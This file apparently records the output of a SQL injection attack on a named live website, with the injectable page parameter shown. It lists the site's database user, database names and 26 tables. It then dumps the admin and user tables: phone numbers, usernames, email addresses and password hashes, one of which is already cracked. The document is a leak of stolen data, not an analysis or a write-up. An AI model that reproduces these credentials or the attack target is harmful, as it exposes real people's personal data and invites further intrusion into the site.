@@ -1,0 +1,56 @@
+.co Colombia
+
+.in India
+
+Digital Talent | SEO | PHP | Web Design | Digital Marketing
+
+https://digitaltalent.co.in/blog-details.php?id=1
+
+[+] 'kyunkiay_posdftr'@'localhost' [1]:
+
+available databases [2]:                                                                                                                                              
+[+] information_schema
+[+] kyunkiay_ytrfkldfg
+
+Database: kyunkiay_ytrfkldfg
+[26 tables]
++---------------+
+| scroll        |
+| user          |
+| admin_user    |
+| banner        |
+| blog          |
+| career        |
+| certification |
+| cms           |
+| cms_fnl       |
+| comment       |
+| course        |
+| discount      |
+| event_book    |
+| footer_text   |
+| gallery       |
+| logo          |
+| media         |
+| menu          |
+| mydata        |
+| news          |
+| otp           |
+| page_banner   |
+| placement     |
+| services      |
+| testimonial   |
+| testpaper     |
++---------------+
+
+Database: kyunkiay_ytrfkldfg
+Table: admin_user
+Table: user
+[2 entry]
++------------+----------+--------------------------+------------------------------------------+
+| phone      | username | email                    | password                                 |
++------------+----------+--------------------------+------------------------------------------+
+| 7751027463 | admin    | makarandra1234@gmail.com | c3284d0f94606de1fd2af172aba15bf3 (admin) |
++------------+----------+--------------------------+------------------------------------------+
+| 7327070297 | digital  | sspattanayak4u@gmail.com | b9559221a7c3009a4ddbdce06f7fb3ba         |
++------------+----------+--------------------------+------------------------------------------+
